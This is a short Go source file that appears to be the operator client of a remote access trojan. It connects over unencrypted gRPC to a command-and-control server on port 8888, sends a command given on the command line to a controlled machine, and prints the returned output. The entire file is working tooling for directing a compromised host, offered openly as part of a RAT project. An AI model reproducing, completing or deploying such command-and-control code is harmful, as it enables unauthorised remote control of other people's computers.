package main

import (
	"context"
	"fmt"
	"log"
	"os"

	"github.com/lufeee/rat/grpcapi"

	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 8888), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)

	cmd := new(grpcapi.Command)
	cmd.In = os.Args[1]
	cmd, err = client.RunCommand(context.Background(), cmd)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(cmd.Out)
}
